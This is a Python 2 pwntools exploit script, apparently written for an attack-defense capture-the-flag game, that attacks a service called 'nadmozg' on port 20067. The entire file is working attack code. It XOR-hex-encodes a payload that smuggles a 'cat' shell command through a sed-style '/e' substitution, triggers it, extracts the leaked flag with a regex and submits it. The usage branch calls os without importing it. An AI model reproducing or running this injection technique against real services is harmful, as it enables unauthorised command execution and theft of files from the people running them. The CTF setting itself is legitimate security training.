#!/usr/bin/env python2
import pwn, re, random, string, sys

sys.path.append('./utilities/')
from utils import sendFlag
from utils import getFlagID

def exploit(ip, port, flag_id):
    pwn.context(timeout=10)
    dict_id = "".join(random.choice(string.ascii_letters) for i in range(30))
    word = "".join(random.choice(string.ascii_letters) for i in range(30))
    payload = "{} 0a DELIM s/{}/cat {}/e".format("".join(random.choice(string.ascii_letters) for i in range(30)), word, flag_id)
    r = pwn.remote(ip, port)
    r.recvline()
    r.send("dict {}\n".format(dict_id))
    info = r.recvline()
    m = re.match("Please enter your alphanumeric password xored with byte 0x([0-9A-F]{2}) and hex encoded:\n", info)
    byte = int(m.group(1), 16)
    r.send(''.join(chr(ord(c) ^ byte) for c in payload).encode('hex') + '\n')
    r.recvline()
    r.send("translate {}\n".format(word))
    r.send('quit\n')
    r.recvline()
    flagline = r.recvline()
    flag = re.match("s/secretik/(.*)/gi;", flagline).group(1)
    return flag

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: %s <ip>" % os.path.basename(__file__))
        sys.exit(1)
    else:
        print sendFlag(exploit(sys.argv[1], 20067, getFlagID("nadmozg")), "nadmozg")
